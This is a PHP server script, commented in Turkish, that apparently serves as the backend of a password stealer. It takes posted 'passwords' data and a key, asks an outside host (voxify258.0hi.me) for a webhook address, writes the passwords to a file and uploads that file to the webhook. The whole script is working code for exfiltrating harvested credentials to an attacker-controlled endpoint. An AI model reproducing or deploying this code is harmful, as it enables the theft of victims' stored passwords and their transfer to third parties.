<?php

// JSON verisini al
$json_data = file_get_contents('php://input');

// JSON verisini diziye dönüştür
$data = json_decode($json_data, true);

// key ve autofill değerlerini al
$key = isset($data['key']) ? $data['key'] : null;
$passwords = isset($data['passwords']) ? $data['passwords'] : null;

// Eksik key veya passwords değeri varsa hata dön
if (!$key || !$passwords) {
    http_response_code(400);
    echo json_encode(array("error" => "Missing key or passwords data"));
    exit;
}

// Klasörleri oluştur
$directories = ["./Vct", "./Vct/passwords"];
foreach ($directories as $directory) {
    if (!file_exists($directory)) {
        mkdir($directory, 0777, true); // İzinleri belirt
    }
}

// API isteği için payload oluştur
$payload = array(
    'key' => $key
    // Diğer payload verileri varsa buraya eklenebilir
);

// API isteği yap ve cevabı al
$api_url = 'http://voxify258.0hi.me/keysorgu/keysorgu.php';
$options = array(
    'http' => array(
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => json_encode($payload)
    )
);
$context = stream_context_create($options);
$response = file_get_contents($api_url, false, $context);

// API isteği sırasında hata oluşursa
if ($response === false) {
    http_response_code(500);
    echo json_encode(array("error" => "Error while making API request"));
    exit;
}

// API cevabı metin olarak al
$webhook = trim($response);

// API cevabında hatalı veya eksik veri varsa
if (empty($webhook)) {
    http_response_code(400);
    echo json_encode(array("error" => "Invalid or missing webhook URL"));
    exit;
}

// Rastgele dosya adı oluştur
$randomstring = bin2hex(random_bytes(4));

// Autofill ve Dualhook dosyalarını oluştur ve içeriği yaz
$file_written1 = file_put_contents("./Vct/passwords/{$randomstring}.txt", $passwords);

// Dosya yazma sırasında hata oluşursa
if ($file_written1 === false) {
    http_response_code(500);
    echo json_encode(array("error" => "Error while writing file content"));
    exit;
}

// POST verilerini hazırla
$autofillData = array(
    'file' => new CURLFile("./Vct/passwords/{$randomstring}.txt")
);


// cURL işlemlerini başlat
$autofillCurl = curl_init($webhook);

// cURL başlatma sırasında hata oluşursa
if (!$autofillCurl) {
    http_response_code(500);
    echo json_encode(array("error" => "Error while initializing cURL"));
    exit;
}

// POST isteği ayarlarını belirle
$curl_options = array(
    CURLOPT_POST => 1,
    CURLOPT_POSTFIELDS => $autofillData,
    CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($autofillCurl, $curl_options);


// Autofill ve Dualhook cURL isteklerini gerçekleştir
$response1 = curl_exec($autofillCurl);

// cURL isteklerinde hata oluşursa
if ($response1 === false) {
    http_response_code(500);
    echo json_encode(array("error" => "Error while making cURL request"));
    exit;
}

// cURL işlemlerini sonlandır
curl_close($autofillCurl);

// Başarılı yanıtı dön
http_response_code(200);
echo json_encode(array("apidev" => "Redrose"));
?>
